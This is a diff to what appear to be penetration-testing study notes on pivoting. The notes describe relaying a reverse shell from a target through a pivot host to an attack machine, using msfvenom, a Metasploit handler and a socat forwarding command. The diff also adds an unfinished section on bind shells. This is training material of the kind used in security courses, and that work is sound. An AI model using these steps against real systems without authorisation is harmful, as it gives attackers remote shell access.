@@ -261,9 +261,13 @@ msf6 > use exploit/multi/handler
 4. Once we transfer and execute the payload on the target system, we should see the reverse connection get forwarded all the way back to our attack machine's listener
 
 ### Using [[Socat]] redirection for Reverse Shells
-1. Generate our payload (*that will connect to our pivot host*) and start a listener (*on our attack machine, waiting for the payload connection*) (eg. `msfvenom` & `msfconsole - multi/handler`).
+1. Generate our payload (*that will connect to our pivot host*) and start a listener (*on our attack machine, waiting for the payload connection*) (eg. [[MSFVenom]] & [[Metasploit]] - `multi/handler`).
 2. Use [[Socat]] to start a listener on the pivot host, redirecting traffic it receives from our payload to our attack host.
 ```sh
 $ socat TCP4-LISTEN:<payload_traffic_port>, fork TPC4:<attack_host>:<port>
 ```
 3. Transfer the payload to the target system and execute, catch the reverse shell with the listener
+
+### Using [[Socat]] redirection for Bind Shells
+1. Generate the bind shell payload (*specify the port to receive the connection on*)
+2. 
